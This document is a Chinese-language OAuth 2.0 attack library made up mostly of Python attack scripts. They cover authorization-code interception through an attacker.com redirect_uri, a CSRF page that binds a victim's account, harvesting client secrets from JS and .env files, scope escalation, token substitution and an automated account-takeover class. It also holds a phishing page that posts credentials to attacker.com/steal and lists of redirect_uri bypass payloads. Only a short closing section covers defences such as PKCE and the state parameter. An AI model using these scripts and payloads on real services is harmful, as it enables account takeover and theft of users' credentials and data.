# OAuth 2.0 认证绕过攻击库

## 漏洞概述

OAuth 2.0是一个广泛使用的授权框架,允许第三方应用程序在用户授权下访问HTTP服务上的资源。然而,OAuth实现中的配置错误和漏洞可能导致账户接管、令牌泄露和未授权访问。

**OAuth 2.0核心组件**:
- Resource Owner (资源所有者) - 用户
- Client (客户端) - 第三方应用
- Authorization Server (授权服务器)
- Resource Server (资源服务器)

**常见授权流程**:
- Authorization Code (授权码模式)
- Implicit (隐式模式)
- Resource Owner Password (密码模式)
- Client Credentials (客户端凭证模式)

## 核心攻击技术

### 1. 授权码拦截攻击

**原理**: 攻击者拦截授权码,用它兑换访问令牌

**场景**: 授权码通过HTTP传输或redirect_uri验证不严

**正常流程**:
```
1. 用户访问: https://client.com/login
2. 重定向到: https://auth.com/oauth/authorize?
   client_id=123&
   redirect_uri=https://client.com/callback&
   response_type=code
3. 用户授权后重定向: https://client.com/callback?code=AUTH_CODE
4. 客户端用code换取token
```

**攻击流程**:

```python
#!/usr/bin/env python3
"""
OAuth授权码拦截攻击
"""
import requests
from urllib.parse import urlparse, parse_qs

def intercept_authorization_code():
    """拦截并使用授权码"""
    
    # 场景1: 攻击者控制的redirect_uri
    malicious_redirect = "https://attacker.com/callback"
    
    # 构造授权URL
    auth_url = (
        "https://oauth-server.com/authorize?"
        "client_id=legitimate_client&"
        f"redirect_uri={malicious_redirect}&"
        "response_type=code&"
        "scope=read_profile"
    )
    
    print(f"[*] 诱骗用户访问: {auth_url}")
    print("[*] 用户授权后,授权码会发送到攻击者服务器")
    
    # 攻击者服务器收到授权码
    intercepted_code = "INTERCEPTED_AUTH_CODE"
    
    # 使用授权码兑换访问令牌
    token_url = "https://oauth-server.com/token"
    data = {
        "grant_type": "authorization_code",
        "code": intercepted_code,
        "redirect_uri": malicious_redirect,
        "client_id": "legitimate_client",
        "client_secret": "leaked_or_guessed_secret"
    }
    
    r = requests.post(token_url, data=data)
    
    if r.status_code == 200:
        tokens = r.json()
        access_token = tokens['access_token']
        print(f"[+] 获取访问令牌: {access_token[:20]}...")
        
        # 使用令牌访问用户资源
        api_url = "https://api.example.com/user/profile"
        headers = {"Authorization": f"Bearer {access_token}"}
        
        r = requests.get(api_url, headers=headers)
        print(f"[+] 用户数据: {r.json()}")
        
        return access_token
    
    return None

# 场景2: redirect_uri操纵
def manipulate_redirect_uri():
    """操纵redirect_uri绕过验证"""
    
    legitimate_uri = "https://client.com/callback"
    
    # 尝试各种绕过技术
    bypass_attempts = [
        # 子域名
        "https://attacker.client.com/callback",
        
        # 路径遍历
        "https://client.com/callback/../../../attacker",
        
        # 开放重定向
        "https://client.com/callback?url=https://attacker.com",
        
        # URL编码
        "https://client.com%2f%40attacker.com/callback",
        
        # 片段标识符
        "https://client.com/callback#attacker.com",
        
        # 反斜杠
        "https://client.com\\attacker.com/callback",
        
        # @符号
        "https://client.com@attacker.com/callback",
    ]
    
    for uri in bypass_attempts:
        print(f"[*] 尝试: {uri}")
        
        auth_url = (
            f"https://oauth-server.com/authorize?"
            f"client_id=123&"
            f"redirect_uri={uri}&"
            f"response_type=code"
        )
        
        # 发送请求测试
        r = requests.get(auth_url, allow_redirects=False)
        
        if r.status_code in [200, 302]:
            print(f"[+] 可能成功: {uri}")

if __name__ == "__main__":
    intercept_authorization_code()
    manipulate_redirect_uri()
```

### 2. CSRF攻击 - State参数缺失

**原理**: 缺少state参数或验证不当,导致CSRF攻击

**攻击场景**: 攻击者将受害者的账户绑定到攻击者的OAuth账户

**攻击步骤**:

```html
<!-- 攻击者网页 -->
<!DOCTYPE html>
<html>
<head>
    <title>OAuth CSRF Attack</title>
</head>
<body>
    <h1>正在加载...</h1>
    
    <script>
    // 1. 攻击者获取自己的授权码
    // 访问: https://oauth.com/authorize?client_id=...&redirect_uri=...
    // 获取: https://client.com/callback?code=ATTACKER_CODE
    
    // 2. 构造CSRF页面,自动提交受害者
    window.location = "https://client.com/callback?code=ATTACKER_CODE";
    </script>
</body>
</html>
```

**效果**: 受害者的账户现在绑定到攻击者的OAuth账户,攻击者可以登录受害者的账户

**Python攻击脚本**:

```python
def oauth_csrf_attack(victim_url):
    """OAuth CSRF攻击"""
    
    print("[*] OAuth CSRF攻击")
    
    # 步骤1: 攻击者获取自己的授权码
    print("[*] 步骤1: 攻击者获取授权码...")
    
    attacker_auth_url = (
        "https://oauth-server.com/authorize?"
        "client_id=target_client&"
        "redirect_uri=https://attacker.com/catch&"
        "response_type=code"
    )
    
    print(f"[*] 授权URL: {attacker_auth_url}")
    print("[*] 攻击者访问并授权,获取授权码")
    
    attacker_code = "ATTACKER_AUTHORIZATION_CODE"
    
    # 步骤2: 构造恶意回调URL
    malicious_callback = (
        f"https://target-site.com/oauth/callback?"
        f"code={attacker_code}"
        # 注意: 没有state参数!
    )
    
    print(f"\n[*] 步骤2: 诱骗受害者访问:")
    print(f"[*] {malicious_callback}")
    
    # 步骤3: 受害者访问后,其账户绑定到攻击者的OAuth账户
    print("\n[+] 攻击成功!")
    print("[+] 受害者账户现在绑定到攻击者的OAuth账户")
    print("[+] 攻击者可以使用自己的OAuth账户登录受害者账户")
```

**防御检测**:

```python
def test_csrf_protection():
    """测试是否存在CSRF保护"""
    
    # 正常流程有state
    normal_url = (
        "https://oauth.com/authorize?"
        "client_id=123&"
        "state=random_token&"
        "redirect_uri=https://client.com/callback"
    )
    
    # 测试1: 移除state参数
    no_state_url = (
        "https://oauth.com/authorize?"
        "client_id=123&"
        "redirect_uri=https://client.com/callback"
    )
    
    r = requests.get(no_state_url)
    
    if r.status_code == 200:
        print("[!] 警告: 服务器接受无state参数的请求")
        print("[!] 可能存在CSRF漏洞")
        return True
    
    # 测试2: 使用错误的state
    wrong_state_url = (
        "https://client.com/callback?"
        "code=AUTH_CODE&"
        "state=wrong_state"
    )
    
    r = requests.get(wrong_state_url)
    
    if "error" not in r.text.lower():
        print("[!] 警告: 服务器未正确验证state")
        return True
    
    return False
```

### 3. 隐式流程令牌泄露

**原理**: 隐式流程将访问令牌直接返回在URL片段中,容易泄露

**正常隐式流程**:
```
1. 重定向到: https://oauth.com/authorize?
   client_id=123&
   redirect_uri=https://client.com/callback&
   response_type=token
2. 用户授权后: https://client.com/callback#access_token=TOKEN&token_type=Bearer
```

**攻击向量**:

```python
def implicit_flow_attacks():
    """隐式流程攻击"""
    
    # 攻击1: Referer泄露
    print("[*] 攻击1: Referer头泄露令牌")
    
    # 如果callback页面加载外部资源
    # <img src="https://attacker.com/track.gif">
    # Referer会包含完整URL(包括片段)
    
    # 攻击2: 浏览器历史
    print("[*] 攻击2: 浏览器历史记录泄露")
    print("[*] 令牌存储在浏览器历史中")
    
    # 攻击3: 开放重定向
    print("[*] 攻击3: 开放重定向")
    
    malicious_url = (
        "https://client.com/redirect?url=https://attacker.com#"
        "https://oauth.com/authorize?"
        "client_id=123&"
        "redirect_uri=https://client.com/redirect?url=https://attacker.com&"
        "response_type=token"
    )
    
    print(f"[*] 恶意URL: {malicious_url}")
```

### 4. 客户端凭证泄露

**场景**: 客户端密钥硬编码或泄露

**检测方法**:

```python
def find_client_secrets():
    """查找泄露的客户端密钥"""
    
    import re
    
    # 常见位置
    locations = [
        # JavaScript文件
        "https://target.com/static/js/app.js",
        "https://target.com/static/js/oauth.js",
        
        # 移动应用
        "AndroidManifest.xml",
        "Info.plist",
        "config.json",
        
        # Git泄露
        ".git/config",
        ".env",
    ]
    
    # 常见模式
    patterns = [
        r'client_secret["\s:=]+([a-zA-Z0-9_-]{20,})',
        r'CLIENT_SECRET["\s:=]+([a-zA-Z0-9_-]{20,})',
        r'api_secret["\s:=]+([a-zA-Z0-9_-]{20,})',
    ]
    
    for location in locations:
        try:
            r = requests.get(location, timeout=5)
            content = r.text
            
            for pattern in patterns:
                matches = re.findall(pattern, content)
                if matches:
                    print(f"[+] 在 {location} 发现密钥:")
                    for match in matches:
                        print(f"    {match}")
        except:
            continue

# 使用泄露的密钥
def exploit_leaked_secret(client_id, client_secret):
    """利用泄露的客户端密钥"""
    
    # 客户端凭证流程
    token_url = "https://oauth.com/token"
    
    data = {
        "grant_type": "client_credentials",
        "client_id": client_id,
        "client_secret": client_secret
    }
    
    r = requests.post(token_url, data=data)
    
    if r.status_code == 200:
        token = r.json()['access_token']
        print(f"[+] 获取访问令牌: {token[:20]}...")
        return token
    
    return None
```

### 5. Scope提升攻击

**原理**: 操纵scope参数请求更高权限

**攻击示例**:

```python
def scope_escalation():
    """Scope权限提升"""
    
    # 正常请求的scope
    normal_scope = "read_profile"
    
    # 尝试请求更高权限
    escalated_scopes = [
        "read_profile write_profile",
        "read_profile admin",
        "read_profile delete_account",
        "*",
        "all",
    ]
    
    for scope in escalated_scopes:
        auth_url = (
            f"https://oauth.com/authorize?"
            f"client_id=123&"
            f"scope={scope}&"
            f"redirect_uri=https://client.com/callback&"
            f"response_type=code"
        )
        
        print(f"[*] 尝试scope: {scope}")
        
        r = requests.get(auth_url, allow_redirects=False)
        
        if r.status_code == 200:
            print(f"[+] 服务器接受scope: {scope}")

# 令牌scope操纵
def manipulate_token_scope():
    """操纵令牌scope"""
    
    import jwt
    
    # 场景: JWT访问令牌
    token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
    
    # 解码
    decoded = jwt.decode(token, options={"verify_signature": False})
    
    print(f"[*] 原始scope: {decoded.get('scope')}")
    
    # 修改scope
    decoded['scope'] = 'admin full_access'
    
    # 重新编码(如果能获取签名密钥)
    # new_token = jwt.encode(decoded, secret_key, algorithm='RS256')
    
    print(f"[*] 修改后scope: {decoded.get('scope')}")
```

### 6. 令牌替换攻击

**原理**: 将一个应用的令牌用于另一个应用

**攻击场景**:

```python
def token_substitution():
    """令牌替换攻击"""
    
    # 场景: App A 和 App B 使用同一OAuth提供商
    
    # 1. 攻击者在App A获取令牌
    app_a_token = "TOKEN_FOR_APP_A"
    
    # 2. 在App B使用App A的令牌
    app_b_api = "https://app-b.com/api/user"
    
    headers = {
        "Authorization": f"Bearer {app_a_token}"
    }
    
    r = requests.get(app_b_api, headers=headers)
    
    if r.status_code == 200:
        print("[+] 令牌替换成功!")
        print("[+] App A的令牌在App B中有效")
        print(f"[+] 数据: {r.json()}")
    else:
        print("[-] 令牌替换失败")
        print(f"[-] 状态码: {r.status_code}")
```

## 完整攻击场景

### 场景1: 账户接管攻击链

```python
#!/usr/bin/env python3
"""
完整的OAuth账户接管攻击
"""
import requests
import time

class OAuthAccountTakeover:
    def __init__(self, target_domain, oauth_provider):
        self.target = target_domain
        self.oauth = oauth_provider
        self.client_id = None
        self.client_secret = None
    
    def recon(self):
        """步骤1: 侦察"""
        print("[*] 步骤1: 侦察OAuth配置...")
        
        # 查找OAuth配置
        config_urls = [
            f"https://{self.target}/.well-known/oauth-authorization-server",
            f"https://{self.target}/oauth/config",
            f"https://{self.target}/api/oauth/metadata",
        ]
        
        for url in config_urls:
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    config = r.json()
                    print(f"[+] 发现配置: {url}")
                    print(f"[+] 授权端点: {config.get('authorization_endpoint')}")
                    print(f"[+] 令牌端点: {config.get('token_endpoint')}")
                    return config
            except:
                continue
        
        return None
    
    def find_client_creds(self):
        """步骤2: 查找客户端凭证"""
        print("\n[*] 步骤2: 查找客户端凭证...")
        
        # 检查JavaScript文件
        js_files = [
            f"https://{self.target}/static/js/main.js",
            f"https://{self.target}/static/js/oauth.js",
        ]
        
        import re
        
        for js_file in js_files:
            try:
                r = requests.get(js_file, timeout=5)
                
                # 查找client_id
                client_id_match = re.search(
                    r'client_id["\s:=]+([a-zA-Z0-9_-]+)',
                    r.text
                )
                
                if client_id_match:
                    self.client_id = client_id_match.group(1)
                    print(f"[+] 发现client_id: {self.client_id}")
                
                # 查找client_secret
                secret_match = re.search(
                    r'client_secret["\s:=]+([a-zA-Z0-9_-]{20,})',
                    r.text
                )
                
                if secret_match:
                    self.client_secret = secret_match.group(1)
                    print(f"[+] 发现client_secret: {self.client_secret[:10]}...")
            
            except:
                continue
    
    def test_redirect_uri(self):
        """步骤3: 测试redirect_uri验证"""
        print("\n[*] 步骤3: 测试redirect_uri验证...")
        
        legitimate_uri = f"https://{self.target}/oauth/callback"
        
        bypass_uris = [
            f"https://attacker.com@{self.target}/oauth/callback",
            f"https://{self.target}.attacker.com/oauth/callback",
            f"https://{self.target}/oauth/callback@attacker.com",
            f"https://{self.target}/oauth/callback?redirect=https://attacker.com",
        ]
        
        for uri in bypass_uris:
            auth_url = (
                f"https://{self.oauth}/authorize?"
                f"client_id={self.client_id}&"
                f"redirect_uri={uri}&"
                f"response_type=code"
            )
            
            r = requests.get(auth_url, allow_redirects=False)
            
            if r.status_code in [200, 302]:
                print(f"[+] 可能绕过: {uri}")
                return uri
        
        return None
    
    def csrf_attack(self):
        """步骤4: CSRF攻击"""
        print("\n[*] 步骤4: 测试CSRF保护...")
        
        # 测试无state参数
        auth_url = (
            f"https://{self.oauth}/authorize?"
            f"client_id={self.client_id}&"
            f"redirect_uri=https://{self.target}/oauth/callback&"
            f"response_type=code"
            # 注意: 没有state参数
        )
        
        r = requests.get(auth_url, allow_redirects=False)
        
        if r.status_code == 200:
            print("[!] 服务器接受无state参数的请求")
            print("[!] 存在CSRF漏洞!")
            return True
        
        return False
    
    def exploit(self):
        """执行完整攻击"""
        print(f"[*] 目标: {self.target}")
        print(f"[*] OAuth提供商: {self.oauth}\n")
        
        # 侦察
        config = self.recon()
        
        # 查找凭证
        self.find_client_creds()
        
        if not self.client_id:
            print("[-] 未找到client_id,攻击终止")
            return False
        
        # 测试redirect_uri
        bypass_uri = self.test_redirect_uri()
        
        # 测试CSRF
        has_csrf = self.csrf_attack()
        
        if bypass_uri or has_csrf:
            print("\n[+] 发现可利用的漏洞!")
            print("[+] 可以进行账户接管攻击")
            return True
        else:
            print("\n[-] 未发现可利用的漏洞")
            return False

# 使用
if __name__ == "__main__":
    attacker = OAuthAccountTakeover(
        target_domain="vulnerable-app.com",
        oauth_provider="oauth-provider.com"
    )
    
    attacker.exploit()
```

### 场景2: 社交工程 + OAuth

```python
def social_engineering_oauth():
    """社交工程结合OAuth攻击"""
    
    print("[*] 社交工程OAuth攻击")
    
    # 1. 创建钓鱼授权页面
    phishing_page = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>登录 - Facebook</title>
        <style>
            /* 仿造Facebook登录页面样式 */
        </style>
    </head>
    <body>
        <h1>使用Facebook登录</h1>
        <form action="https://attacker.com/steal" method="POST">
            <input type="email" name="email" placeholder="电子邮件">
            <input type="password" name="password" placeholder="密码">
            <button type="submit">登录</button>
        </form>
    </body>
    </html>
    """
    
    print("[*] 创建钓鱼页面")
    
    # 2. 诱骗用户
    phishing_url = (
        "https://attacker.com/phishing?"
        "next=https://legitimate-app.com/oauth/callback"
    )
    
    print(f"[*] 钓鱼URL: {phishing_url}")
    
    # 3. 窃取凭证后,使用真实OAuth
    print("[*] 窃取凭证后,使用真实OAuth API访问用户数据")
```

## 自动化检测工具

### 1. 自定义扫描器

```python
#!/usr/bin/env python3
"""
OAuth漏洞扫描器
"""
import requests
from urllib.parse import urlparse, parse_qs
import re

class OAuthScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.findings = []
    
    def extract_oauth_params(self, url):
        """提取OAuth参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        oauth_params = {}
        oauth_keys = ['client_id', 'redirect_uri', 'response_type', 'scope', 'state']
        
        for key in oauth_keys:
            if key in params:
                oauth_params[key] = params[key][0]
        
        return oauth_params
    
    def test_state_parameter(self):
        """测试state参数"""
        print("[*] 测试state参数...")
        
        # 发送无state的请求
        r = requests.get(self.target)
        
        if 'state=' not in r.url:
            finding = "缺少state参数 - 可能存在CSRF漏洞"
            print(f"[!] {finding}")
            self.findings.append(finding)
            return True
        
        return False
    
    def test_redirect_uri_validation(self, base_redirect_uri):
        """测试redirect_uri验证"""
        print("[*] 测试redirect_uri验证...")
        
        test_uris = [
            f"{base_redirect_uri}@attacker.com",
            f"{base_redirect_uri}.attacker.com",
            f"{base_redirect_uri}/../../../attacker",
            f"{base_redirect_uri}?redirect=https://attacker.com",
            f"{base_redirect_uri}%2f%40attacker.com",
        ]
        
        for test_uri in test_uris:
            # 构造测试URL
            test_url = self.target.replace(
                base_redirect_uri,
                test_uri
            )
            
            try:
                r = requests.get(test_url, allow_redirects=False, timeout=5)
                
                if r.status_code in [200, 302]:
                    finding = f"redirect_uri验证可能存在缺陷: {test_uri}"
                    print(f"[!] {finding}")
                    self.findings.append(finding)
            except:
                continue
    
    def test_scope_manipulation(self):
        """测试scope操纵"""
        print("[*] 测试scope操纵...")
        
        escalated_scopes = ['admin', '*', 'all', 'root']
        
        for scope in escalated_scopes:
            test_url = re.sub(
                r'scope=[^&]*',
                f'scope={scope}',
                self.target
            )
            
            try:
                r = requests.get(test_url, timeout=5)
                
                if r.status_code == 200:
                    finding = f"服务器接受提升的scope: {scope}"
                    print(f"[!] {finding}")
                    self.findings.append(finding)
            except:
                continue
    
    def scan(self):
        """执行完整扫描"""
        print(f"[*] 扫描目标: {self.target}\n")
        
        # 提取OAuth参数
        params = self.extract_oauth_params(self.target)
        print(f"[*] OAuth参数: {params}\n")
        
        # 运行各项测试
        self.test_state_parameter()
        
        if 'redirect_uri' in params:
            self.test_redirect_uri_validation(params['redirect_uri'])
        
        self.test_scope_manipulation()
        
        # 报告
        print(f"\n[*] 扫描完成")
        print(f"[*] 发现 {len(self.findings)} 个潜在问题")
        
        return self.findings

# 使用
scanner = OAuthScanner(
    "https://oauth.com/authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code&scope=read"
)
findings = scanner.scan()
```

### 2. Burp Suite测试

**手动测试步骤**:

1. **拦截授权请求**
```
GET /oauth/authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code&state=xyz HTTP/1.1
```

2. **测试redirect_uri**
```
# 修改为
redirect_uri=https://attacker.com/callback
redirect_uri=https://client.com@attacker.com/callback
```

3. **移除state参数**
```
# 删除state参数,观察是否仍然允许
GET /oauth/authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code HTTP/1.1
```

4. **测试scope提升**
```
# 修改scope
scope=admin
scope=*
```

## 实战Payload集合

### redirect_uri绕过Payloads

```
# 子域名
https://attacker.client.com/callback

# 路径
https://client.com/callback/../../../attacker
https://client.com//attacker.com/callback

# @ 符号
https://client.com@attacker.com/callback

# 反斜杠
https://client.com\\attacker.com/callback

# URL编码
https://client.com%2f%40attacker.com/callback
https://client.com%252f%40attacker.com/callback

# 点号
https://client.com.attacker.com/callback

# 开放重定向
https://client.com/callback?url=https://attacker.com
https://client.com/callback?next=https://attacker.com
```

### Scope提升Payloads

```
scope=admin
scope=administrator
scope=*
scope=all
scope=root
scope=read write delete admin
```

## 防御措施

### 1. 严格验证redirect_uri

```python
def validate_redirect_uri(provided_uri, registered_uris):
    """严格验证redirect_uri"""
    
    # 完全匹配
    if provided_uri in registered_uris:
        return True
    
    # 不允许任何变体
    return False
```

### 2. 实施state参数

```python
import secrets

def generate_state():
    """生成随机state"""
    return secrets.token_urlsafe(32)

def validate_state(session_state, provided_state):
    """验证state"""
    if not provided_state:
        raise ValueError("缺少state参数")
    
    if session_state != provided_state:
        raise ValueError("state参数不匹配")
    
    return True
```

### 3. 使用PKCE

```python
import hashlib
import base64
import secrets

def generate_code_verifier():
    """生成code_verifier"""
    return base64.urlsafe_b64encode(
        secrets.token_bytes(32)
    ).decode('utf-8').rstrip('=')

def generate_code_challenge(verifier):
    """生成code_challenge"""
    digest = hashlib.sha256(verifier.encode('utf-8')).digest()
    return base64.urlsafe_b64encode(digest).decode('utf-8').rstrip('=')

# 授权请求
verifier = generate_code_verifier()
challenge = generate_code_challenge(verifier)

auth_url = (
    f"https://oauth.com/authorize?"
    f"client_id=123&"
    f"code_challenge={challenge}&"
    f"code_challenge_method=S256"
)

# 令牌请求时提供verifier
```

### 4. 安全存储客户端密钥

```python
# 不要硬编码
# BAD: client_secret = "hardcoded_secret"

# 使用环境变量
import os
client_secret = os.environ.get('OAUTH_CLIENT_SECRET')

# 或使用密钥管理服务
```

### 5. 限制scope

```python
def validate_scope(requested_scope, allowed_scopes):
    """验证请求的scope"""
    
    requested = set(requested_scope.split())
    allowed = set(allowed_scopes)
    
    if not requested.issubset(allowed):
        raise ValueError("请求的scope超出允许范围")
    
    return True
```

## 参考资源

- [OAuth 2.0 RFC 6749](https://tools.ietf.org/html/rfc6749)
- [OAuth 2.0 Security Best Current Practice](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [PKCE RFC 7636](https://tools.ietf.org/html/rfc7636)
- [PortSwigger OAuth Authentication](https://portswigger.net/web-security/oauth)

---

**最后更新**: 2025-11-16
**适用场景**: 使用OAuth 2.0的Web应用、移动应用、API
**攻击难度**: 中等
**检测难度**: 需要理解OAuth流程和仔细测试各个环节
